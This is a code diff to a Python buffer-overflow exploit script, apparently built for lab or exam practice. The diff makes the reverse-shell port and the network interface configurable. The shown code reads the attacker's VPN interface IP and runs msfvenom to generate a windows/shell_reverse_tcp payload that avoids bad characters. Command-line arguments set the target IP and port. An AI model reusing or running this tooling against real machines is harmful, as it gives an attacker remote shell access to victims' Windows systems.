@@ -176,11 +176,11 @@ def badchars_not_esp(offset: int) -> str:
 
 def shell_gen(badchars: str):
     """Generates the shellcode using the vpn tunnel ip address"""
-    execute("ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 > /tmp/ip")
+    execute(f"ip addr show {interface} | grep 'inet ' | " + "awk '{print $2}' | cut -d'/' -f1 > /tmp/ip")
     ip = open("/tmp/ip", "r").read().strip()
     print(f"[+] IP Detected: {ip}")
 
-    command = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT=443  EXITFUNC=thread -b \"{badchars}\" -f raw > /tmp/shellcode 2>/dev/null"
+    command = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f raw > /tmp/shellcode 2>/dev/null"
     execute(command)
     print("[+] Generated shellcode at /tmp/shellcode")
 
@@ -256,15 +256,18 @@ if __name__ == "__main__":
     parser.add_argument("--suffix", help = "suffix of the string to send", default = "\r\n")
     parser.add_argument("--ip", help = "target ip address", required = True)
     parser.add_argument("--port", help = "target port to exploit", required = True)
+    parser.add_argument("--rport", help = "reverse shell port", default = 443)
     parser.add_argument("--interface", help = "the interface to use", default = "tun0")
 
     args = parser.parse_args()
 
-    global ip, port, timeout, prefix, suffix
+    global ip, port, timeout, prefix, suffix, rport, interface
     ip: str = args.ip
     port: int = int(args.port)
+    rport: int = int(args.rport)
     timeout: int = 5
     prefix: bytes = args.prefix.encode()
     suffix: bytes = args.suffix.encode()
+    interface: str = args.interface
 
     main()
